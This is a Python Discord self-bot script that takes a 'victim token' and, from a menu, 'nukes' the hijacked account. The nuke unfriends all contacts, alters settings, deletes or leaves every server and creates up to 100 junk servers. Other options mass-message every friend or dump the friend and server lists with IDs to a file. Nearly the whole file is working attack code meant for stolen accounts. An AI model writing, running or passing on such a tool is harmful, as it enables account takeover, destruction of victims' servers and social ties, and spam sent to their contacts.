import random, aiohttp, datetime, time, random, discord
newicon = "ICON HERE"
content = "`Content"
print('Type "help" for a list of commands but first make sure to put victims token')
token = input('Put victim token:')
contentt = "Status here"

class MyClient(discord.Client):
    async def on_connect(self):
        print('--------------------')
        print('Uselesscoderfrompakistan / Uselesscoderfromindia')
        print('Date: {0}'.format(time.asctime()))
        print('User: {0}'.format(client.user))
        print('--------------------')
        while True:
            tokenchoice = input(';;')
            if tokenchoice == '1':
                await Nuke(token)

            elif tokenchoice == '2':
                await massdm(token)

            elif tokenchoice == '3':
                await backup(token) 
            elif tokenchoice == 'help':
                print('------------------------')
                print('Select option')
                print('[1] Nuke Acc')
                print('[2] Massdm Acc')
                print('[3] Backup Acc')
                print('------------------------')

async def massdm(token):
    for friend in client.user.friends:
        try:
            embed = discord.Embed(title='`Text here`', color=0xf3c300, description= f'''{content} \n `Text here`''')
            embed.set_thumbnail(url="Icon here")
            embed.set_footer(text="Text here ;;🎸")
            await friend.send(embed=embed)
            print('{0} Massed'.format(friend.name))
        except:
            pass
    print('Finished')

async def Nuke(token):
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=contentt), status=discord.Status.dnd)
    print('--------------------\nNuking {0}'.format(client.user))
    for friend in client.user.friends:
        try:
            await friend.remove_friend()
            print('{0} - {1} Unfriended'.format(len(client.user.friends), friend.name))
        except:
            print('{0} - {1} Wasn\'t Unfriended'.format(len(client.user.friends), friend.name))
            pass
    await client.user.edit_settings(theme=discord.Theme.light, locale="ko", developer_mode=True, animate_emojis=False, gif_auto_play=False, render_reactions=False, default_guilds_restricted=True, message_display_compact=True)
    for guild in client.guilds:
        try:
            await guild.delete()
            print('{0} - {1} Deleted'.format(len(client.guilds), guild.name))
        except:
            pass

        try:
            await guild.leave()
            print('{0} - {1} Left'.format(len(client.guilds), guild.name))
        except:
            pass
    for guild in range(100):
        try:
         guild = await client.create_guild(name=random.choice(['UselessCoderFromIndia', 'UselessCoderFromPakistan', 'UselessCoderFromIndia', 'UselessCoderFromPakistan']))
         print('{0} - {1} Created'.format(len(client.guilds), guild.name))
        except:
         print('Guild creation failed at {0} guilds'.format(len(client.guilds)))
         return
    print('Nuke finished\n--------------------')

async def backup(token):
    file = open(f"Backup-{client.user}.txt", 'w')
    file.write("""India <3\n""")
    file.write('User: {0}\n'.format(client.user))
    file.write("Date: {0}\n----------------------------------\n\n".format(time.asctime()))
    for friend in client.user.friends:
       file.write(f"""{friend} - {friend.id}\n""")
    file.write('\nEND OF FRIEND BACKUP \n----------------------------------\n\n')
    for guild in client.guilds:
        file.write(f"{guild} - {guild.id} - Members: {guild.member_count} \n")
    file.write("\nPakistan <3 \n----------------------------------\n")
    print("Backup Finshed")

client = MyClient()
client.run(token, bot=False)